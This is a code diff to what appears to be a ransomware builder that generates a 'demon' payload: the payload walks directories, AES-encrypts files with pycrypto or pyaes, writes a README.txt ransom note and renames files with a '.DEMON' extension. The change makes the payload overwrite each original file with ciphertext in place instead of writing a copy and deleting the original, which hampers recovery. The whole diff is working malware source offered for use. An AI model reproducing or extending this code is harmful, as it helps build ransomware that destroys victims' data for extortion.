@@ -61,7 +61,6 @@ def start_encrypt(p, key):
                             encrypt_file(os.path.join(path, name), key)
                             <debug>
                             c +=1
-                            os.remove(os.path.join(path, name))
 
                 with open(path + '/README.txt', 'w') as f:
                     f.write(message)
@@ -200,7 +199,6 @@ from io import BytesIO
         demon = demon.replace('<import_aes>', '')
         demon = demon.replace('<type>', '')
         demon = demon.replace('encrypt_file(os.path.join(path, name), key)', "os.rename(os.path.join(path, name), os.path.join(path, name) + '.DEMON')")
-        demon = demon.replace('os.remove(os.path.join(path, name))', '')
     elif type == 'pycrypto':
         type = """def encrypt(message, key, key_size=256):
     message = pad(message)
@@ -212,8 +210,9 @@ def encrypt_file(file_name, key):
     with open(file_name, 'rb') as fo:
         plaintext = fo.read()
     enc = encrypt(plaintext, key)
-    with open(file_name + ".DEMON", 'wb') as fo:
+    with open(file_name, 'wb') as fo:
         fo.write(enc)
+    os.rename(file_name, file_name + '.DEMON')
 """
         demon = demon.replace('<import_random>', 'from Crypto import Random')
         demon = demon.replace('<import_aes>', 'from Crypto.Cipher import AES')
@@ -225,8 +224,9 @@ def encrypt_file(file_name, key):
         with open(file_name, 'rb') as fo:
             plaintext = fo.read()
         enc = aes.encrypt(plaintext)
-        with open(file_name + '.DEMON', 'wb') as fo:
+        with open(file_name, 'wb') as fo:
             fo.write(enc)
+        os.rename(file_name, file_name + '.DEMON')
 """
         demon = demon.replace('<import_random>', '')
         demon = demon.replace('<import_aes>', 'import pyaes')
